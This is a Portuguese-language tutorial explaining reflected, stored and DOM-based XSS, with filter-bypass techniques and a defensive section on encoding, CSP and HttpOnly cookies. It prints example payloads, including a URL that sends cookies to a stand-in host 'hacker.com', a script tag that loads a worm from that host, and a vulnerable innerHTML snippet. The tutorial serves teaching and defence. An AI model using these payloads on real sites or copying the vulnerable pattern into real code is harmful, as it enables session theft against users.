# 💉 XSS (Cross-Site Scripting): Executando Scripts no Alvo

O XSS ocorre quando um atacante consegue injetar código JavaScript malicioso em uma página legítima, que será executado no navegador da vítima. Diferente de outras injeções, o alvo aqui não é o servidor, mas sim o **usuário final**.

## 🚀 Como funciona na prática?
Imagine um campo de "Comentários" que não limpa o que o usuário digita. Se você digitar `<script>alert('Hackeado!')</script>`, qualquer um que ler seu comentário verá o alerta. Em um cenário real, o script roubaria cookies ou redirecionaria o usuário.

## 👺 Os 3 Tipos Principais de Ataque

### 1. 📬 XSS Refletido (Reflected)
O payload é enviado via parâmetro na URL e "reflete" na resposta da página.
- **Vetor**: Links maliciosos enviados por e-mail ou redes sociais.
- **Exemplo**: `http://site.com/search?q=<script>document.location='http://hacker.com/steal?c='+document.cookie</script>`
- **Característica**: Não é persistente; exige que a vítima clique no link.

### 2. 💾 XSS Armazenado (Stored) - O Pesadelo!
O script malicioso é salvo permanentemente no servidor (banco de dados, logs, fóruns).
- **Vetor**: Postagens em redes sociais, perfis de usuário, campos de endereço.
- **Impacto**: Como o código está no servidor, qualquer pessoa que visite a página será infectada automaticamente. É o tipo de XSS usado para criar "Worms" em redes sociais.
- **Exemplo**: Um atacante altera seu "Nome de Usuário" para `<script src="http://hacker.com/worm.js"></script>`.

### 3. 🌳 XSS Baseado em DOM (Document Object Model)
A vulnerabilidade existe inteiramente no código JavaScript do lado do cliente (client-side).
- **Como ocorre**: O JS lê dados de uma "Source" (fonte) insegura (como `location.hash`) e os passa para um "Sink" (sumidouro) perigoso como `innerHTML`, `document.write()` ou `eval()`.
- **Exemplo**: `var name = decodeURIComponent(window.location.hash.substring(1)); document.getElementById('welcome').innerHTML = name;`
- **Ataque**: `http://site.com/#<img src=x onerror=alert(1)>`

## 🧪 Técnicas de Bypass de Filtros (WAF Bypass)
Atacantes usam criatividade quando o básico `<script>` é bloqueado:
- **Event Handlers**: `<svg onload=alert(1)>`, `<body onscroll=alert(1)>`, `<details open ontoggle=alert(1)>`.
- **Ofuscação**: Usar codificação decimal ou hexadecimal: `&#60;script&#62;alert(1)&#60;/script&#62;`.
- **JavaScript Pseudoprotocol**: `<a href="javascript:alert(1)">Clique aqui</a>`.

## 🛡️ Estratégias de Defesa (Blue Team)
1. **Context-Aware Output Encoding**: Não use a mesma codificação para tudo. Codificar para HTML é diferente de codificar para um atributo de tag ou para dentro de um bloco `<script>`.
2. **CSP (Content Security Policy)**: O header definitivo. Exemplo: `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com`. Isso proíbe scripts inline e domínios não autorizados.
3. **HttpOnly Flags**: Marcar cookies sensíveis como `HttpOnly` impede que o JavaScript os acesse via `document.cookie`, mitigando o roubo de sessão mesmo se houver XSS.
4. **Utilizar Frameworks Modernos**: React, Angular e Vue fazem o escaping automático por padrão (mas cuidado com funções como `dangerouslySetInnerHTML`).

---
**Tags:** `XSS`, `JavaScript-Security`, `Client-Side`, `Payloads`, `CSP`, `Session-Hijacking`